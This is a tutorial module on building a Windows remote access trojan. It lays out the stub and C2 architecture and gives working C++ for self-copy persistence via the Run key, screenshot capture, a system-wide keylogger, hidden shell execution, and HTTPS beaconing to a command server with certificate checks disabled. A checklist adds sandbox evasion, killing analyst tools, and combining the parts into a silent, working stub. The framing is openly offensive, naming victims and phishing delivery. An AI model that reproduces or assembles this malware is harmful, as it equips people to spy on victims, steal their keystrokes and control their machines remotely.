# Module 09 — RAT Architecture

## 1. What a RAT Is

A Remote Access Tool (RAT) has two components:

```
┌──────────────────┐         HTTPS/TCP         ┌──────────────────┐
│    STUB / AGENT  │ ─────────────────────────► │   C2 SERVER      │
│  (runs on victim)│ ◄───────────────────────── │  (your server)   │
└──────────────────┘                            └──────────────────┘
        ↑
        └── Delivered via phishing / USB / exploit
```

The **stub** (agent/implant) runs on the target machine. It:
- Establishes persistence (survives reboot)
- Beacons to C2 periodically
- Executes commands sent by C2
- Sends results back

The **C2 server** (Command & Control):
- Listens for beacons
- Stores information about each connected bot
- Lets the operator send commands
- Receives and displays results

---

## 2. Stub Architecture

```
WinMain()
    │
    ├── AntiAnalysis phase
    │     ├── Environment checks (HAL9TH, RAM, screen, processes)
    │     ├── Hypervisor check
    │     ├── Sleep-skip check
    │     └── StartupDelay() — 18 seconds
    │
    ├── Read config (XOR-decoded from appended bytes)
    │     └── C2 host, port, auth key, persistence name
    │
    ├── Install persistence
    │     └── Copy self to %APPDATA%, write Run key
    │
    ├── Start background threads
    │     ├── AntiProcesses thread — kill analyst tools every 3s
    │     └── Keylogger thread (optional)
    │
    └── C2 loop (main thread)
          ├── POST /beacon { id, hostname, username, os, ip }
          ├── Parse command from response
          ├── Execute command
          │     ├── shell   → CreateProcess + pipe capture
          │     ├── screenshot → GDI capture
          │     ├── keylog  → flush buffer
          │     ├── download → HTTP file fetch
          │     ├── upload  → send file bytes
          │     └── uninstall → delete self + Run key
          ├── POST /result { id, cmd, data }
          └── Sleep(interval + jitter)
```

---

## 3. Config Embedding

The Builder writes a XOR-encoded config blob after the stub binary:

```
[Stub.exe bytes][XOR-encoded config 643 bytes][8-byte magic marker]
```

The stub's `WinMain` reads this at startup:

```cpp
void readConfig(Settings* s) {
    char selfPath[MAX_PATH];
    GetModuleFileNameA(nullptr, selfPath, MAX_PATH);

    std::ifstream f(selfPath, std::ios::binary | std::ios::ate);
    size_t size = f.tellg();

    // Read last 651 bytes: 643 config + 8 magic
    f.seekg(size - 651);
    std::vector<char> tail(651);
    f.read(tail.data(), 651);

    // Verify magic
    const char magic[] = {'\xB4','\x4B','\xD4','\x3E','\x7A','\x91','\xC3','\xF8'};
    if (memcmp(tail.data() + 643, magic, 8) != 0) ExitProcess(0);

    // XOR decode config
    // key derived from first 1024 bytes of the file
    // (see Builder/Builder.cpp for key derivation)
    deserialize(s, tail.data());
}
```

---

## 4. Persistence

```cpp
void installPersistence(const char* persistName) {
    // 1. Get own path
    char selfPath[MAX_PATH];
    GetModuleFileNameA(nullptr, selfPath, MAX_PATH);

    // 2. Build target path in %APPDATA%
    char appdata[MAX_PATH];
    SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appdata);
    char targetPath[MAX_PATH];
    snprintf(targetPath, MAX_PATH, "%s\\Microsoft\\%s.exe", appdata, persistName);

    // 3. Copy self if not already there
    if (_stricmp(selfPath, targetPath) != 0) {
        CopyFileA(selfPath, targetPath, FALSE);
    }

    // 4. Write Run key
    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                  0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, persistName, 0, REG_SZ,
                   (BYTE*)targetPath, (DWORD)strlen(targetPath)+1);
    RegCloseKey(hKey);
}
```

---

## 5. Screenshot Capture

```cpp
std::vector<uint8_t> CaptureScreen() {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdcScreen = GetDC(nullptr);          // screen DC
    HDC hdcMem    = CreateCompatibleDC(hdcScreen);
    HBITMAP hBmp  = CreateCompatibleBitmap(hdcScreen, w, h);
    SelectObject(hdcMem, hBmp);

    BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

    // Encode to JPEG via GDI+ (requires gdiplus)
    // ...

    ReleaseDC(nullptr, hdcScreen);
    DeleteDC(hdcMem);
    DeleteObject(hBmp);
    return jpegBytes;
}
```

---

## 6. Keylogger

```cpp
// Low-level keyboard hook — captures all key presses system-wide
LRESULT CALLBACK LLKeyProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* ks = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vk = ks->vkCode;

        char keyName[64] = {};
        // Printable chars:
        if (vk >= 0x30 && vk <= 0x5A) {
            bool shift = GetAsyncKeyState(VK_SHIFT) & 0x8000;
            keyName[0] = shift ? vk : tolower(vk);
        } else {
            // Special keys: [ENTER], [BACKSPACE], [TAB], etc.
            GetKeyNameTextA(ks->scanCode << 16, keyName, sizeof(keyName));
        }

        std::lock_guard<std::mutex> lock(keyMtx);
        keyBuffer += keyName;
    }
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

void startKeylogger() {
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, LLKeyProc, nullptr, 0);

    // Message loop — required for the hook to fire
    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hook);
}
```

---

## 7. Shell Command Execution

```cpp
std::string ExecShell(const std::string& cmd) {
    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa = {sizeof(sa), nullptr, TRUE};
    CreatePipe(&hRead, &hWrite, &sa, 0);
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = si.hStdError = hWrite;

    PROCESS_INFORMATION pi = {};
    std::string cmdline = "cmd.exe /C " + cmd;
    CreateProcessA(nullptr, cmdline.data(), nullptr, nullptr,
                   TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(hWrite);

    std::string output;
    char buf[4096];
    DWORD read;
    while (ReadFile(hRead, buf, sizeof(buf), &read, nullptr) && read)
        output.append(buf, read);

    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);
    return output;
}
```

---

## 8. C2 Communication (WinINet)

```cpp
std::string c2Post(const std::string& path, const std::string& body,
                   const std::string& host, INTERNET_PORT port) {
    HINTERNET hi = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                                  INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, 0);
    HINTERNET hc = InternetConnectA(hi, host.c_str(), port,
                                     nullptr, nullptr, INTERNET_SERVICE_HTTP, 0, 0);

    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE
                | INTERNET_FLAG_SECURE;
    HINTERNET hr = HttpOpenRequestA(hc, "POST", path.c_str(),
                                     nullptr, nullptr, nullptr, flags, 0);

    DWORD opt = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
    InternetSetOptionA(hr, INTERNET_OPTION_SECURITY_FLAGS, &opt, sizeof(opt));

    const char* hdrs = "Content-Type: application/json\r\n";
    HttpSendRequestA(hr, hdrs, (DWORD)strlen(hdrs),
                     (LPVOID)body.c_str(), (DWORD)body.size());

    std::string resp;
    char buf[4096];
    DWORD read;
    while (InternetReadFile(hr, buf, sizeof(buf), &read) && read)
        resp.append(buf, read);

    InternetCloseHandle(hr);
    InternetCloseHandle(hc);
    InternetCloseHandle(hi);
    return resp;
}
```

---

## 9. Building Your Own From Scratch — Checklist

Work through these in order. Each item should be a separate, compilable file
before you combine them:

- [ ] Read config from appended bytes (ex01)
- [ ] Persistence (Run key + self-copy) (ex02)
- [ ] Single-instance mutex check
- [ ] Sandbox detection score ≥ 50 → exit (Module 08)
- [ ] 18-second startup delay with QPC verification (Module 08)
- [ ] AntiProcesses thread (Module 05)
- [ ] Shell execution with output capture (ex03)
- [ ] Screenshot capture (ex04)
- [ ] Keylogger thread (ex05)
- [ ] C2 beacon POST (ex06)
- [ ] C2 command parsing + dispatch table (Module 03)
- [ ] Combine into WinMain, compile with -mwindows, test silently

---

## Exercises

- `ex01_config_reader.cpp` — read XOR-decoded config from own binary
- `ex02_persistence.cpp` — self-copy + Run key install/check/remove
- `ex03_shell_exec.cpp` — shell command with output capture
- `ex04_screenshot.cpp` — screen capture to JPEG bytes
- `ex05_keylogger.cpp` — low-level hook keylogger thread
- `ex06_beacon.cpp` — WinINet HTTPS beacon to a local server
- `ex07_full_stub.cpp` — combine all of the above into a working stub
